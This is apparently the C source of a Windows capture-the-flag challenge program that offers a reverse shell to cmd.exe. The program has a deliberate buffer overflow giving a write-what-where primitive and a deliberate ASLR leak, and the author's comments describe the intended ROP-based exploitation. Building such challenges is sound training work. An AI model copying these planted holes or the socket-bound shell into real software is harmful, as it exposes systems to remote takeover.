#include <WinSock2.h> //prima di windows.h!!!
//#include <WS2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>
#pragma comment(lib,"ws2_32")

//TODO after compile: Set TLS Directory to RVA of tlsDirectoryInRdata; size=0x18
int tlsIndex = 0;
int tlsCallbacks[4] = { 0,0,0,0 };//we want this in .data (writable)
const DWORD tlsDirectoryInRdata[] = { 0,0,(DWORD)&tlsIndex ,(DWORD)&tlsCallbacks ,0,0 };//StartAddressOfRawData, EndAddressOfRawData, AddressOfIndex, AddressOfCallBacks, SizeOfZeroFill, Characteristics
DWORD * dummy_forceCompilerToAddTlsDirArray = (DWORD*)((DWORD)&tlsDirectoryInRdata^0x981798);//dummy reference so compiler emit array above

SOCKET mySocket;
char ipAddr[16] = "";
unsigned short int port = 0;
const char correctOwner[] = "Nesos";//const to keep read only
struct _keepTheseFar {
	int debugModeData;//disable shell creation .data section (far from heap)
	int dummyhole1;
	int dummyhole2;
	int * debugModeHeap;//can be overvritten using write-what-where but you can't change anymore "where"; this goes on heap but not the pointer!! so keep these far!
	//be sure debugModeData far from debugModeHeap after compile
}keepTheseFar;

struct _keepTheseNear {
	char owner[8];//mod 4 to be alligned? keep short or people will use write-what-where to craft rop on stack
	char * ptrOwner;
	int *debugModeHeap2;
	int dummy;
}keepTheseNear;

//arrResult size>=lenStr/2
bool HexStringToByteArray(char * str, int lenStr, byte * arrResult)
{
	if (lenStr <= 0 || lenStr % 2 != 0)
	{
		printf("Odd length\n");
		return false;
	}
	for (int i = 0, j = 0; i < lenStr; i += 2, j++)
	{
		if (str[i + 1] >= '0' && str[i + 1] <= '9')
			arrResult[j] = str[i + 1] - '0';
		else if (str[i + 1] >= 'A' && str[i + 1] <= 'F')
			arrResult[j] = str[i + 1] - 'A' + 10;
		else if (str[i + 1] >= 'a' && str[i + 1] <= 'f')
			arrResult[j] = str[i + 1] - 'a' + 10;
		else
		{
			printf("Not hex value\n");
			return false;
		}
		if (str[i] >= '0' && str[i] <= '9')
			arrResult[j] |= (str[i] - '0') << 4;
		else if (str[i] >= 'A' && str[i] <= 'F')
			arrResult[j] |= (str[i] - 'A' + 10) << 4;
		else if (str[i] >= 'a' && str[i] <= 'f')
			arrResult[j] |= (str[i] - 'a' + 10) << 4;
		else
		{
			printf("Not hex value\n");
			return false;
		}
	}
	return true;
}

//strResult size>= (srcBufSize*2)+1
bool ByteArrayToHexString(byte * arr, int srcBufSize, char * strResult)
{
	if (strResult == NULL || arr == NULL)
		return false;
	for (int i = 0; i < srcBufSize; i++)
	{
		sprintf_s(&(strResult[i*2]), 3, "%.2X", arr[i] & 0xFF);
	}
	return true;
}

void GetString(char * str, int bufSize)
{
	if (str == NULL)
		return;
	int result = 0;
	do
	{
		result = scanf_s("%s", str, bufSize);
		fseek(stdin, 0, SEEK_END);//flush chars
		if (result == 0)
		{
			printf("String too long\n");
			continue;
		}
	} while (result == 0);
}

//void RawReadString(char * str, int bufSize)
//{
//	HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
//	DWORD read = 0;
//	if (!ReadFile(in, str, bufSize, &read, 0))
//		exit(-2);
//}

int GetNum()
{
	int num = -1;
	int result = 0;
	do
	{
		result = scanf_s("%d", &num);
		fseek(stdin, 0, SEEK_END);//flush chars
		if (result == 0 || num < 0)
		{
			printf("Not a valid number\n");
			continue;
		}
	} while (result == 0);
	return num;
}

void SetIpPort()
{
	printf("Give IP address:\n");
	GetString(ipAddr, sizeof(ipAddr));
	printf("Give port:\n");	
	port = (unsigned short int) GetNum();
	printf("Thanks!\n");
}

void Connect()
{
	struct sockaddr_in sockAddr;

	mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	if (mySocket == NULL)
	{
		printf("Failed to create socket\n");
		return;
	}

	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port = htons(port);
	sockAddr.sin_addr.s_addr = inet_addr(ipAddr);
	int result = WSAConnect(mySocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);
	if (result != 0)
	{
		printf("Failed to connect: %X\n",result);
		return;
	}
	WSABUF dati;
	char itWorks[] = "It works!\n";
	int siz = sizeof(itWorks);
	dati.buf = itWorks;
	dati.len = siz;
	DWORD bytesSent;
	if (WSASend(mySocket, &dati, 1, &bytesSent, 0, 0, 0) == 0)
		printf("Connection established, now spawn the shell\n");
	else
		printf("Error sending data\n");
}

void SetOwner()
{
	//4 bytes overflow to trigger write-what-where (1 time use, set where 1 time<-important, write n times)
	//tot writable bytes: 8+4=12=3 addresses-->need stack spacing (params?) in ClearDebugMode otherwise people will replace stack with ropchain: cleardbg+spawnShell
	
	char hexOwner[((8+4)*2)+1];//(8 bytes+4overlow)*2 (is a hex string) +1 (null)
	int ownerLen;
	printf("Give shell owner:\n");	
	bool result;
	do
	{
		GetString(hexOwner, sizeof(hexOwner));
		ownerLen = (int)strnlen_s(hexOwner, sizeof(hexOwner) - 1);
		result = HexStringToByteArray(hexOwner, ownerLen, (byte*)(keepTheseNear.ptrOwner));

	} while (result == false);
	printf("Thanks!\n");
}

void SpawnReverseShell()
{
	char prog[8];
	prog[0] = 'c';//initialized here to avoid using "rop" style to jump/execute after the owner/debug check: 1°set correct program->2°check everything ok->3°execute shell
	prog[1] = 'm';//jumping to point 3 you execute nothing
	prog[2] = 'd';
	prog[3] = 0;
	if (strncmp(correctOwner, keepTheseNear.owner, sizeof(correctOwner)))//comprende null char; owner, non ptrowner
	{
		printf("Only the correct owner has the permission to spawn a shell!\n");//quitta all'interno di printf->never call printf while process is unloading
		return;
	}
	if (keepTheseFar.debugModeData != 1 || *(keepTheseFar.debugModeHeap) != 1 || *(keepTheseNear.debugModeHeap2) != 1)//*always not NULL
	{
		printf("Not in debug mode; shell disabled\n");
		return;
	}
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFOA));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)mySocket;
	CreateProcessA(NULL, prog, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

void PrintShellcode()
{
	int len = 0x23;//dal decompilato
	char hexPrint[(0x23 * 2) + 1];//dal decompilato
	printf("not the usual shellcode but you asked so let's print it anyway:\n");
	ByteArrayToHexString((byte*)SpawnReverseShell, len, hexPrint);
	printf("%s\n", hexPrint);//defeat aslr, 32bit doesn't support high entropy so the wole exe is randomized but sections are still alligned (get anything from security cookie)
	printf("and so on...\n");
}

void PrintIpPort()
{
	int ip = inet_addr(ipAddr);
	char strIp[4][4];
	_itoa_s(ip & 0xFF, strIp[0], 4, 10);
	_itoa_s((ip >> 8) & 0xFF, strIp[1], 4, 10);
	_itoa_s((ip >> 16) & 0xFF, strIp[2], 4, 10);
	_itoa_s((ip >> 24) & 0xFF, strIp[3], 4, 10);
	printf("IP address: %s.%s.%s.%s\n", strIp[0], strIp[1], strIp[2], strIp[3]);
	printf("Port: %d\n", port);
}

void PrintSecretMenu()
{
	/*
	char shamelessAd[] = "You have found the secret menu!!\n\n"
		"I have a cat\n"
		"I also have Qubes OS\n"
		"the first isn't vulnerable to zero days because is a cat\n"
		"the second isn't vulnerable to zero days* because is coded by Rutkovska, 1337 infosec genius.\n"
		"Citation: \"What good is an OS that might not have any bugs, if it cannot protect against apps that might?\n"
		"E.g.can a buggy web browser or email client be effectively constrained if exploited?\"\n\n"
		"https://www.qubes-os.org/doc/split-gpg/\n"
		"now you know that Qubes OS exists :)\n"
		"but this [advertisement] i mean this information is useless for solving the challenge so move on and spawn a shell!\n"
		"you will have time later to find out how great is it!\n"
		"*you need two zerodays: one to takeover the vm other to takeover xen; on win/linux one is enough (or zero if someone is kind enough to open your virus)=at least x2 more secure\n";
	char nodec[]= "*you need two zerodays: one to takeover the vm other to takeover xen; on win/linux one is enough (or zero if someone is kind enough to open your virus)=at least x2 more secure\n";
	printf("len e: %d\n", strlen(shamelessAd));//835
	printf("len d: %d\n", strlen(shamelessAd) - strlen(nodec));//659
	*/
	byte shamelessAd[] = { 0x70, 0x4C, 0xCB, 0xA4, 0x89, 0x0D, 0xA0, 0xCB, 0x72, 0xF6, 0x26, 0x84, 0x9F, 0xDF, 0xC9, 0x9F, 0xDB, 0xC3, 0xFB, 0x4F, 0xE2, 0x6F, 0x4C, 0xFC, 0x50, 0x7E, 0x60, 0x79, 0x68, 0xC2, 0x66, 0xFF, 0xB9, 0x18, 0x04, 0xE8, 0x2B, 0xDA, 0xFD, 0xC3, 0x3F, 0x62, 0x7A, 0x1E, 0x68, 0x4C, 0x2F, 0x56, 0x7D, 0xB5, 0xA7, 0x8F, 0xF9, 0xD5, 0x2D, 0x5A, 0x65, 0x68, 0xA9, 0x5B, 0x69, 0xB9, 0xCB, 0x41, 0x00, 0xD5, 0x03, 0xE4, 0x34, 0x10, 0x53, 0xDD, 0x74, 0x20, 0x40, 0x85, 0xEA, 0x5D, 0x20, 0xAF, 0xC3, 0x68, 0x60, 0xD2, 0x32, 0x35, 0x0A, 0xBE, 0x0E, 0xB6, 0x51, 0xD5, 0x5E, 0x5E, 0x81, 0x56, 0x99, 0x02, 0xEB, 0xF8, 0x93, 0xE4, 0x3F, 0xBE, 0xD1, 0xB3, 0xEA, 0x22, 0xDB, 0x17, 0xFE, 0x28, 0x59, 0xF3, 0x1B, 0xE5, 0xF0, 0xA6, 0xC9, 0xE1, 0x92, 0x89, 0xA8, 0xB8, 0x59, 0xCB, 0x0F, 0xB3, 0x9F, 0x67, 0xB3, 0x1D, 0x42, 0xB2, 0xEA, 0x46, 0xEA, 0x9C, 0x39, 0x6E, 0x15, 0xDF, 0x1F, 0xFA, 0x0D, 0xA3, 0xB4, 0x6C, 0xFC, 0xFE, 0x7A, 0x17, 0x52, 0x92, 0x72, 0xD0, 0xFE, 0x2A, 0x38, 0x18, 0x22, 0xB3, 0x89, 0x40, 0x5F, 0x79, 0xEB, 0xAB, 0x77, 0x7D, 0x52, 0x01, 0xED, 0x69, 0xD4, 0xBC, 0xA7, 0xBF, 0xB7, 0xCB, 0x3D, 0x1B, 0x51, 0xEF, 0x50, 0x5B, 0xD4, 0x9E, 0xBA, 0xA7, 0xFB, 0x42, 0x3E, 0xA0, 0xE4, 0x14, 0xCA, 0xF9, 0x2C, 0x19, 0xD6, 0xF7, 0xD7, 0x42, 0x16, 0xE7, 0xE8, 0x37, 0x6B, 0x3C, 0x70, 0x67, 0xB1, 0x0F, 0xE4, 0xCB, 0x08, 0x2B, 0x1F, 0x44, 0x52, 0x47, 0xE3, 0x6B, 0x71, 0x1F, 0xFC, 0xE0, 0x44, 0x76, 0x99, 0xD9, 0xE4, 0x4A, 0x49, 0x72, 0x97, 0x29, 0x0E, 0x24, 0xFF, 0x00, 0x2E, 0xB8, 0x78, 0x0F, 0x28, 0x3B, 0xF4, 0x83, 0x22, 0x2B, 0xA4, 0x77, 0x05, 0x1F, 0x9D, 0x7E, 0xCF, 0x31, 0xC3, 0xC1, 0x50, 0xA8, 0x11, 0x9F, 0x24, 0xBE, 0x05, 0x22, 0x8B, 0x45, 0xD4, 0x27, 0xA6, 0xBF, 0x5B, 0xE2, 0x2B, 0x9C, 0xA3, 0x40, 0x30, 0x49, 0xB7, 0x44, 0xEB, 0x37, 0x18, 0x42, 0xA4, 0xE2, 0xB9, 0xBF, 0x07, 0xA0, 0x2C, 0x09, 0x0D, 0x05, 0x69, 0x06, 0x21, 0x7D, 0xDF, 0x48, 0x1E, 0x85, 0x70, 0x58, 0xB1, 0xFF, 0xF6, 0xDD, 0x63, 0xE6, 0xE3, 0xAC, 0x42, 0x98, 0x72, 0x75, 0xEE, 0xAA, 0xCB, 0xDE, 0xCF, 0xA7, 0x50, 0x8A, 0xC9, 0xF4, 0x87, 0xE7, 0xE2, 0xD7, 0x21, 0xD8, 0xFD, 0x9E, 0xF9, 0x54, 0xB4, 0x37, 0xB0, 0x5A, 0x5A, 0xBE, 0xAE, 0x1F, 0xC4, 0x14, 0x7E, 0x21, 0x93, 0x10, 0xF9, 0x93, 0xB8, 0x18, 0xF3, 0xC2, 0xC6, 0x8E, 0x65, 0xFE, 0xDA, 0x33, 0x45, 0x5A, 0x4F, 0x66, 0xEC, 0xCF, 0xE4, 0x1C, 0x19, 0x02, 0x11, 0xB4, 0x06, 0xDD, 0x5F, 0xFF, 0xB9, 0x46, 0x03, 0x4D, 0x16, 0x92, 0xF7, 0x7B, 0x5A, 0xDA, 0x5D, 0x86, 0x56, 0xEF, 0x7E, 0x94, 0x15, 0x7E, 0x8F, 0x03, 0x41, 0xD5, 0x7B, 0x44, 0x22, 0xE9, 0xC8, 0x09, 0x57, 0x35, 0x73, 0xF4, 0x7C, 0x2E, 0x2A, 0x4A, 0x6C, 0x5F, 0x16, 0xE7, 0xB4, 0x92, 0x4E, 0xEB, 0x35, 0x1B, 0x67, 0xAF, 0xDD, 0xC7, 0xFF, 0x99, 0x91, 0x96, 0x84, 0x12, 0xD0, 0xD3, 0xA0, 0x57, 0x1C, 0x72, 0xA1, 0x19, 0xF7, 0x1F, 0x5C, 0x47, 0xBE, 0xD1, 0xF5, 0x9E, 0xA2, 0xAD, 0x33, 0x61, 0x40, 0xE2, 0x95, 0x47, 0x5F, 0x04, 0x98, 0xC6, 0x20, 0xA6, 0x63, 0xE0, 0xC8, 0x3E, 0x1B, 0x33, 0x44, 0xB5, 0xDC, 0x90, 0xB2, 0xD7, 0x0E, 0xEB, 0xFA, 0xAA, 0x7B, 0x32, 0xF7, 0xDA, 0x3A, 0x1C, 0xD6, 0x06, 0x13, 0x7D, 0xEA, 0xED, 0x88, 0x6C, 0x94, 0x32, 0x5F, 0xC6, 0xD2, 0x0F, 0x20, 0x56, 0x66, 0xAE, 0xCF, 0x64, 0x03, 0x6C, 0x85, 0x23, 0x21, 0x16, 0x87, 0x6B, 0x94, 0x45, 0x66, 0xC3, 0xDE, 0xEF, 0xBC, 0xDE, 0xAC, 0x48, 0x8D, 0xB5, 0xFC, 0x60, 0x24, 0x9B, 0x17, 0x07, 0x30, 0x31, 0x5C, 0xE9, 0xB2, 0x9D, 0xA1, 0xE9, 0xF4, 0x53, 0x03, 0x02, 0xD7, 0xD4, 0xA7, 0xE6, 0x23, 0xDC, 0x2C, 0xE4, 0x20, 0x4A, 0xB9, 0x93, 0x55, 0xD4, 0x40, 0xBD, 0xD9, 0xE1, 0xC1, 0x64, 0x24, 0x87, 0x00, 0x24, 0x85, 0xA6, 0xF0, 0xC4, 0x75, 0xF0, 0x63, 0x27, 0x20, 0x49, 0x90, 0x6C, 0xB0, 0x4F, 0x60, 0xB3, 0x5C, 0xC3, 0xEE, 0x04, 0x3D, 0x60, 0x22, 0xAA, 0xDC, 0x16, 0xAF, 0x03, 0xB9, 0xEE, 0xD9, 0xD8, 0xFA, 0xBB, 0x7A, 0xC9, 0x0C, 0x4B, 0x46, 0xD6, 0x6F, 0xCC, 0xD7, 0xDB, 0x45, 0xD2, 0xDD, 0xA4, 0xA5, 0x49, 0x5E, 0x55, 0x7D, 0x49, 0x3F, 0x21, 0xFB, 0x78, 0x76, 0xA0, 0xB2, 0xF3, 0xAC, 0x86, 0xB7, 0x7E, 0xFC, 0xA1, 0x50, 0x0E, 0x1C, 0x48, 0x75, 0x10, 0x9C, 0x35, 0xA4, 0xC7, 0x18, 0x64, 0x68, 0x11, 0x79, 0xB3, 0x23, 0x37, 0xFF, 0x46, 0xEC, 0x52, 0xB5, 0x11, 0x79, 0x9E, 0x6F, 0x43, 0xCF, 0xDA, 0x90, 0xEF, 0x32, 0x87, 0xB0, 0xE4, 0x0D, 0x14, 0xFE, 0x4E, 0xF9, 0xE4, 0x2D, 0x00, 0x31, 0x7C, 0xCA, 0xD6, 0x0D, 0xDC, 0x9C, 0x8E, 0x7A, 0xCE, 0x85, 0x93, 0x40, 0xFB, 0x06, 0x59, 0x5B, 0x82, 0x36, 0x42, 0xE5, 0xFE, 0xE7, 0x42, 0x2E, 0xD7, 0x91, 0xE8, 0x6A, 0x4F, 0x53, 0xF0, 0x04, 0x2F, 0xF2, 0xA3, 0xB1, 0x91, 0xDF, 0x55, 0x24, 0x2B, 0xCE, 0x1A, 0x01, 0x23, 0x58, 0xF7, 0x04, 0xC0, 0x7C, 0x39, 0xF5, 0xBD, 0xF9, 0x63, 0x46, 0x46, 0xEF, 0xD6, 0x80, 0xED, 0x67, 0xC4, 0xEF, 0x27, 0x44, 0x0B, 0xA5, 0x84, 0xB6, 0xB1, 0xF3, 0x83, 0xF6, 0xFD, 0x62, 0x90, 0xBA, 0x2A, 0xAB, 0xEF, 0x24, 0xA8, 0x3D, 0x3C, 0xD0, 0xD3, 0x79, 0x07, 0x6A, 0x5B, 0x5F, 0x36, 0xE0, 0x31, 0xDD, 0x69, 0x51, 0x20, 0x0F, 0x49, 0x82, 0xB6, 0x22, 0xEC, 0x2D, 0x92, 0x62, 0x5B, 0xD3, 0x7A, 0xCC, 0xC2, 0xD7, 0x5A, 0x01, 0xC2, 0x27, 0x17, 0x0F, 0x68, 0xAB, 0xAD, 0xEE, 0x7E, 0x75, 0x9E, 0x3C, 0x0E, 0x77, 0xA5, 0x37, 0x01, 0xFB, 0x2B, 0x35, 0x75, 0xF7, 0x59, 0x49, 0x0E, 0xF8, 0x9C, 0x6D, 0xA9, 0xCE, 0x95, 0xC0, 0x0E };
	char * decodedAd = (char*)malloc(835+1);
	if (decodedAd == NULL)
		return;
	srand(1);//default seed
	for (int i = 0; i < 659; i++)//len 659
	{
		decodedAd[i] = shamelessAd[i] ^ (rand() & 0xFF);
	}
	decodedAd[659] = 0;//NULL terminator
	printf(decodedAd);
	free(decodedAd);
}

/*
void NTAPI tls_callback(PVOID DllHandle, DWORD dwReason, PVOID __formal)
{
	//if (dwReason == DLL_THREAD_ATTACH)
	//{
	//	MessageBox(0, L"DLL_THREAD_ATTACH", L"DLL_THREAD_ATTACH", 0);
	//}
	//if (dwReason == DLL_PROCESS_ATTACH)
	//{
	//	MessageBox(0, L"DLL_PROCESS_ATTACH", L"DLL_PROCESS_ATTACH", 0);
	//}
	if (dwReason == DLL_PROCESS_DETACH)
	{
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(STARTUPINFOA));
		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		SpawnReverseShell();
		CreateProcessA(NULL, "calc", NULL, NULL, 0, 0, 0, 0, &si, &pi);
		MessageBox(0, L"DLL_PROCESS_DETACH", L"", 0);
	}
	//MessageBox(0, L"in tls", L"", 0);
}
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback_func")
#pragma data_seg(".CRT$XLF")
EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_func = tls_callback;
#pragma data_seg()
*/
void __stdcall SetDebugModeData(int dummy)//important: stdcall+parm = ropchain impossible: 3 addresses write: return to: clear1->clear2->shell but param makes this not possible and clear1+fix stack+1 address left again not possible; maibe do1, ret to main, do2, ret to shell
{
	keepTheseFar.debugModeData = 1;
}
void __stdcall SetDebugModeHeap(int dummy)
{
	*(keepTheseFar.debugModeHeap) = 1;
}
void __stdcall SetDebugModeHeap2(int dummy) //we want this to be done with write-what-where
{
	*(keepTheseNear.debugModeHeap2) = 1;
}
void __stdcall ClearDebugModeData(int dummy)
{
	keepTheseFar.debugModeData = 0;
}
void __stdcall ClearDebugModeHeap(int dummy)
{
	*(keepTheseFar.debugModeHeap) = 0;
}
void __stdcall ClearDebugModeHeap2(int dummy)
{
	*(keepTheseNear.debugModeHeap2) = 0;
}

int RealMain()
{
	keepTheseNear.owner[0] = '\0';//mod 4 to be alligned? keep short or people will use write-what-where to craft rop on stack
	keepTheseNear.ptrOwner = (char*)&(keepTheseNear.owner);
	//keepTheseNear.debugModeHeap2 = NULL;
	//keepTheseNear.dummy = 0;

	//printf("%X %X\n", (int)&tlsDirectoryInRdata, (int)&tlsCallbacks);
	WSADATA wsaData;
	int wsaRet = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (wsaRet != 0)
	{
		printf("WSAStartup error: %d\n", wsaRet);
		return -1;
	}
	keepTheseFar.debugModeHeap = (int*)malloc(4);
	if (keepTheseFar.debugModeHeap == NULL)
	{
		printf("malloc1 fail\n");
		return -1;
	}
	keepTheseNear.debugModeHeap2 = (int*)malloc(4);
	if (keepTheseNear.debugModeHeap2 == NULL)
	{
		printf("malloc2 fail\n");
		return -1;
	}
	ClearDebugModeData(0);
	ClearDebugModeHeap(0);
	ClearDebugModeHeap2(0);
	setvbuf(stdout, NULL, _IONBF, 0);//no buffer
									 //setvbuf(stdin, NULL, _IONBF, 0);//no buffer, crea problemi di lettura
	int scelta = 0;
	printf("Welcome to EzWinShell, a free shell is ready for you!\n");
	Sleep(1000);//anti bruteforce: we randomize stack: max=65535 but we keep alligned by 4 so possible values ar eonly /4=16383 supposing you brute one per second you can solve in 4,5 hours but since usually you need half time you solve in two hours.
	while (true)
	{
		printf("\nWhat do you want to do?\n");
		printf("1-Set IP and port\n");
		printf("2-Connect\n");
		printf("3-Spawn shell\n");
		printf("4-Print shellcode\n");
		printf("5-Print IP and port\n");
		printf("6-Set owner\n");
		printf("0-Exit\n");
		scelta = GetNum();
		switch (scelta)
		{
		case 0:
			//return 0; //va bene anche ExitProcess(0)
			ExitProcess(0);
			break;
		case 1:
			SetIpPort();
			break;
		case 2:
			Connect();
			break;
		case 3:
			SpawnReverseShell();
			break;
		case 4:
			PrintShellcode();
			break;
		case 5:
			PrintIpPort();
			break;
		case 6:
			SetOwner();
			break;
		case 7:
			PrintSecretMenu();
			break;
		default:
			printf("Noooooooooooooooooooo!!!!!!!!!!!!!!!!!!!!!\n");
			break;
		}
	}
	return 0;
}

int main(int argc, char *argv[])
{
	DWORD seed = GetTickCount();
	seed ^= time(NULL);//time is guessable, GetTickCount should not be and anyway you have to bruteforce stack posision due to different os/settings.
	srand(seed);
	DWORD stackSub = (rand() & 0x0000FFFF); //(extra) randomize future stack return addresses (max 65535) must be even nuber or crash, keep mod4 for safety
	stackSub -= stackSub % 4;
	//printf("%d\n", stackSub);
	__asm {
		sub esp,[stackSub] //because we leak aslr and we don't want people abuse stack (probably not necessary but who knows...)	
		mov [stackSub],0
		xor ebp,ebp
	}
	
	/*
	stack randomize (also if aslr present) to prevent this exploit (not sure if possible because you don't know where WinExec is)
	setowner1: <cmd\0><dummy4bytes><setowner stack return address>
	setowner2: <winexec><return addr of winexec=main><ourcmd above>

	and also to prevent this:
	like above but you return to overwrite a check, return to main, do this for all three checks.
	(you have to return a bit after main because main reset the check state)

	and also because wine doesn't have/support aslr '-_- (but noone will notice it hopefully: reverse->exploit local->exploit remote)
	anyway we leak aslr super easy (4-print shellcode) so shouldn't be a problem but...
	i like the idea of leaking aslr because of stack cookie (semi hidden?), and you must know that 32bit doesn't have HIGHENTROPYVA so exe is randomized as single block and not each section.
	by leaking .data section you can find .text section since they move as a single block.
	*/
	return RealMain();//people might overwrite here but we never ret from this call.
}
